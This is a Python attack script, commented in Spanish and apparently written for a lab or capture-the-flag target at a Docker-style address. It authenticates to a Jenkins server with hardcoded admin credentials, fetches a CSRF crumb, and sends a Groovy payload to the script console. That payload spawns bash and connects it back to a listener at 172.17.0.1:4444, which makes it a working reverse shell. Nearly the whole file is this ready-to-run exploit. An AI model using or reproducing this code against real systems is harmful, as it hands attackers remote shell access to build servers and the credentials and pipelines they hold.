import requests
import signal

def salir(sig, frame):
    print("\n\n[!] Saliendo del script de forma segura...")
    exit()

signal.signal(signal.SIGINT, salir)


jenkin_url = 'http://172.17.0.2:8080/'
usuario = 'admin'
pwd = 'rockyou'

# Código en java para ejecutar en jenkins
groovy_payload = """
String host="172.17.0.1";
int port=4444;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
"""

# Con session tenemos abierto una sesion con usuario y contraseña
sesion = requests.Session()
sesion.auth = (usuario, pwd)

# Esta es la url donde se suele almacenar el crumb
# También se podría recoger con burp suite a mano
crum_url = f'{jenkin_url}/crumbIssuer/api/json'
crumb_respuesta = sesion.get(crum_url)

if crumb_respuesta.status_code != 200:
    print("Error en la petición del crumb")
    exit()

# Parseamos a diccionario en json
crumb_json = crumb_respuesta.json()
crumb = crumb_json['crumb']

# url donde se ejecuta el script de groovy
script_url = f'{jenkin_url}/scriptText'

headers = {
    'content-Type' : 'application/x-www-form-urlencoded',
    'Jenkins-Crumb' : crumb
}

data = {
    'script' : groovy_payload
}

print(crumb)

try:
    respuesta = sesion.post(script_url, headers=headers, data=data)
    print(respuesta.text)

    if respuesta.status_code == 200:
        print("Se ha realizado la reverse shell")

    else:
        print("Error al ejecutar la reverse shell" + respuesta.status_code)
        print(respuesta.text)
    
except:
    print("Ha ocurrido un fallo al lanzar la peticion de groovy")